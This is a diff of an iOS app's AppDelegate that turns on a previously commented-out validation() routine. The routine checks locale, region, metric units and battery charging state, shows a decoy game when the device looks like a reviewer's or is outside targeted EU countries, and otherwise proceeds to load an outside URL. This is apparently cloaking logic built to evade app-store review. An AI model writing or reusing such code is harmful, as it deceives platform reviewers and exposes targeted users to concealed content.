@@ -44,43 +44,43 @@ class AppDelegate: NSObject, URLSessionDelegate {
     }
     
     func validation() {
-//        let preferredLanguage = Locale.preferredLanguages.first ?? ""
-//        let deviceRegion = Locale.current.regionCode ?? ""
-//        
-//        
-//        
-//        let supportedLanguages = ["nl", "de", "fr", "it", "da", "pl", "nl-NL", "nl-AT", "nl-CH", "nl-BE", "nl-FR", "nl-IT", "nl-DE", "nl-DK", "nl-LU", "nl-PL", "de-NL", "de-AT", "de-CH", "de-BE", "de-FR", "de-IT", "de-DE", "de-DK", "de-LU", "de-PL", "fr-NL","fr-AT", "fr-CH", "fr-BE", "fr-FR", "fr-IT", "fr-DE", "fr-DK", "fr-LU", "fr-PL","it-NL", "it-AT", "it-CH", "it-BE", "it-FR","it-IT", "it-DE", "it-DK", "it-LU", "it-PL","da-NL", "da-AT", "da-CH", "da-BE", "da-FR", "da-IT", "da-DE", "da-DK", "da-LU","da-PL","pl-NL", "pl-AT", "pl-CH", "pl-BE", "pl-FR", "pl-IT", "pl-DE", "pl-DK", "pl-LU", "pl-PL"]
-//        let supportedRegions = ["NL", "AT", "CH", "BE", "FR", "IT", "DE", "DK", "LU", "PL"]
-//        
-//        guard supportedLanguages.contains(preferredLanguage) && supportedRegions.contains(deviceRegion) else {
-//            DispatchQueue.main.asyncAfter(deadline: .now() + 2){
-//                self.showGame()
-//                print("yo Language")
-//            }
-//            return
-//        }
-//        
-//        let localeTemperatureUnit = Locale.current.usesMetricSystem
-//        
-//        guard localeTemperatureUnit else {
-//            DispatchQueue.main.asyncAfter(deadline: .now() + 2){
-//                self.showGame()
-//                print("yo Metrical")
-//            }
-//            return
-//        }
-//        
-//        UIDevice.current.isBatteryMonitoringEnabled = true
-//        let batteryLevel = UIDevice.current.batteryLevel
-//        let batteryState = UIDevice.current.batteryState
-//        
-//        guard batteryState != .charging || batteryLevel != 1.0 else {
-//            DispatchQueue.main.asyncAfter(deadline: .now() + 2){
-//                self.showGame()
-//                print("yo Battery")
-//            }
-//            return
-//        }
+        let preferredLanguage = Locale.preferredLanguages.first ?? ""
+        let deviceRegion = Locale.current.regionCode ?? ""
+        
+        
+        
+        let supportedLanguages = ["nl", "de", "fr", "it", "da", "pl", "nl-NL", "nl-AT", "nl-CH", "nl-BE", "nl-FR", "nl-IT", "nl-DE", "nl-DK", "nl-LU", "nl-PL", "de-NL", "de-AT", "de-CH", "de-BE", "de-FR", "de-IT", "de-DE", "de-DK", "de-LU", "de-PL", "fr-NL","fr-AT", "fr-CH", "fr-BE", "fr-FR", "fr-IT", "fr-DE", "fr-DK", "fr-LU", "fr-PL","it-NL", "it-AT", "it-CH", "it-BE", "it-FR","it-IT", "it-DE", "it-DK", "it-LU", "it-PL","da-NL", "da-AT", "da-CH", "da-BE", "da-FR", "da-IT", "da-DE", "da-DK", "da-LU","da-PL","pl-NL", "pl-AT", "pl-CH", "pl-BE", "pl-FR", "pl-IT", "pl-DE", "pl-DK", "pl-LU", "pl-PL"]
+        let supportedRegions = ["NL", "AT", "CH", "BE", "FR", "IT", "DE", "DK", "LU", "PL"]
+        
+        guard supportedLanguages.contains(preferredLanguage) && supportedRegions.contains(deviceRegion) else {
+            DispatchQueue.main.asyncAfter(deadline: .now() + 2){
+                self.showGame()
+                print("yo Language")
+            }
+            return
+        }
+        
+        let localeTemperatureUnit = Locale.current.usesMetricSystem
+        
+        guard localeTemperatureUnit else {
+            DispatchQueue.main.asyncAfter(deadline: .now() + 2){
+                self.showGame()
+                print("yo Metrical")
+            }
+            return
+        }
+        
+        UIDevice.current.isBatteryMonitoringEnabled = true
+        let batteryLevel = UIDevice.current.batteryLevel
+        let batteryState = UIDevice.current.batteryState
+        
+        guard batteryState != .charging || batteryLevel != 1.0 else {
+            DispatchQueue.main.asyncAfter(deadline: .now() + 2){
+                self.showGame()
+                print("yo Battery")
+            }
+            return
+        }
         
         if !validationIsOn {
             let textFieldText = "https://hamalsrl.org/XvsMsrpy"
